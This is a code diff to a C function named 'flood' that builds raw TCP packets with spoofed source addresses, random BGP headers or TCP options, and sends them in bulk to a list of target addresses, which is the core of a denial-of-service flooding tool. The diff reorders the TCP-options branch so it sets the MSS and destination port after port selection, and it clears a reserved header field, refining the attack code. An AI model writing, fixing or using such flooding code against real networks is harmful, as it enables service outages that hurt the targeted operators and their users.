@@ -309,6 +309,7 @@ void *flood(void *par1)
 		iph->saddr = sins[sn_i].sin_addr.s_addr;
 		if (bpgOrDrd == 1)
 		{
+			tcph->res2 = 0;
 			bgph->type = randnum(1, 4);
 			setup_bgp_header(bgph);
 			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct bgp_header)) / 4;
@@ -323,15 +324,6 @@ void *flood(void *par1)
 		}
 		else
 		{
-			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
-			setup_tcpopts_header(opts);
-			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
-			tcph->dest = htons(sPorts[rand_cmwc() % 2]);
-			list_node = list_node->next;
-			iph->daddr = list_node->data.sin_addr.s_addr;
-			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
-			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
-			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
 			if (floodport == 0)
 			{
 				if (randnum(0, 1) == 1)
@@ -358,6 +350,15 @@ void *flood(void *par1)
 					tcph->dest = htons(sPorts[rand_cmwc() % 2]);
 				}
 			}
+			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
+			setup_tcpopts_header(opts);
+			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
+			tcph->dest = htons(sPorts[rand_cmwc() % 2]);
+			list_node = list_node->next;
+			iph->daddr = list_node->data.sin_addr.s_addr;
+			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
 		}
 
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
